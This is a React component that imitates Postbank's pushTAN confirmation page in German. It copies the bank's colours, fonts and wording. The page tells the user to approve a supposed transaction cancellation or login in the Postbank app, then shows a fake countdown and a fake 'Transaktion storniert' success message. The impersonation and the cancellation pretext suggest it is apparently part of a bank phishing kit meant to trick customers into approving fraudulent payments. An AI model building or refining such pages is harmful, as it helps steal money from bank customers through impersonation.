import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsWaiting(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    onConfirm();
  };

  if (isLoading) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
        type="processing"
        showProgress={true}
        duration={2}
      />
    );
  }

  return (
    <div className="postbank-container" style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
      fontStyle: 'normal'
    }}>
      <div style={{
        maxWidth: '800px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main TAN Card */}
        <div style={{
          width: '100%',
          maxWidth: '600px',
          backgroundColor: '#ffffff',
          border: '1px solid #d1d8d9',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Yellow Header Bar - Postbank's signature */}
          <div style={{
            backgroundColor: '#fc0',
            padding: '20px',
            textAlign: 'center'
          }}>
            <h1 style={{
              color: '#0018a8',
              fontSize: isMobile ? '1.5rem' : '2rem',
              fontWeight: '700',
              margin: '0',
              fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #d1d8d9',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#333333',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontStyle: 'normal',
                lineHeight: '1.5'
              }}>
                {tanType === 'TRANSACTION_TAN' 
                  ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer Postbank Banking-App.'
                  : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer Postbank Banking-App.'
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #0018a8',
                borderRadius: '8px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#0018a8',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '700',
                  margin: '0 0 20px 0',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                  fontStyle: 'normal',
                  textAlign: 'center'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #d1d8d9'
                  }}>
                    <span style={{
                      color: '#6f7779',
                      fontSize: '14px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontStyle: 'normal',
                      fontWeight: '400'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#0018a8',
                      fontSize: '18px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontWeight: '700',
                      fontStyle: 'normal'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#6f7779',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        fontWeight: '400'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#6f7779',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        fontWeight: '400'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        fontStyle: 'normal',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#6f7779',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        fontWeight: '400'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Status Section */}
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #d1d8d9',
              borderRadius: '8px',
              padding: '30px',
              textAlign: 'center',
              marginBottom: '30px'
            }}>
              {isWaiting ? (
                <div>
                  {/* Postbank Loading Spinner */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    border: '4px solid #d1d8d9',
                    borderTop: '4px solid #0018a8',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    margin: '0 auto 25px auto'
                  }} />
                  
                  <h3 style={{
                    color: '#0018a8',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '700',
                    margin: '0 0 15px 0',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontStyle: 'normal'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                  </h3>
                  
                  <p style={{
                    color: '#6f7779',
                    fontSize: '14px',
                    margin: '0 0 15px 0',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontStyle: 'normal'
                  }}>
                    Bitte bestätigen Sie in Ihrer Postbank App.
                  </p>
                  
                  <p style={{
                    color: '#e10014',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontWeight: '700',
                    fontStyle: 'normal'
                  }}>
                    Timeout in: {formatTime(countdown)}
                  </p>
                </div>
              ) : (
                <div>
                  {/* Success Icon */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    backgroundColor: '#10B981',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    margin: '0 auto 25px auto'
                  }}>
                    <svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                      <path d="M20 6L9 17l-5-5"/>
                    </svg>
                  </div>
                  
                  <h3 style={{
                    color: '#10B981',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '700',
                    margin: '0 0 15px 0',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontStyle: 'normal'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                  </h3>
                  
                  <p style={{
                    color: '#333333',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontStyle: 'normal'
                  }}>
                    Sie können nun fortfahren.
                  </p>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div style={{
              display: 'flex',
              flexDirection: isMobile ? 'column' : 'row',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '15px',
              marginBottom: '20px'
            }}>
              <button
                onClick={handleConfirm}
                disabled={isLoading}
                className="btn-primary"
                style={{
                  backgroundColor: isLoading ? '#ccc' : '#0018a8',
                  color: '#ffffff',
                  border: 'none',
                  padding: '12px 24px',
                  borderRadius: '4px',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                  fontWeight: '700',
                  fontSize: '16px',
                  fontStyle: 'normal',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: isMobile ? '100%' : 'auto',
                  minWidth: '180px'
                }}
                onMouseEnter={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#001470';
                  }
                }}
                onMouseLeave={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#0018a8';
                  }
                }}
              >
                {isWaiting 
                  ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                  : 'Weiter'
                }
              </button>
              
              {onCancel && (
                <button
                  onClick={onCancel}
                  className="btn-secondary"
                  style={{
                    backgroundColor: 'transparent',
                    color: '#0018a8',
                    border: '2px solid #0018a8',
                    padding: '12px 24px',
                    borderRadius: '4px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontWeight: '700',
                    fontSize: '16px',
                    fontStyle: 'normal',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '180px'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#0018a8';
                    (e.target as HTMLButtonElement).style.color = '#ffffff';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                    (e.target as HTMLButtonElement).style.color = '#0018a8';
                  }}
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </button>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#6f7779',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Probleme mit der App? Kontaktieren Sie den Postbank Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export { PushTANScreen };
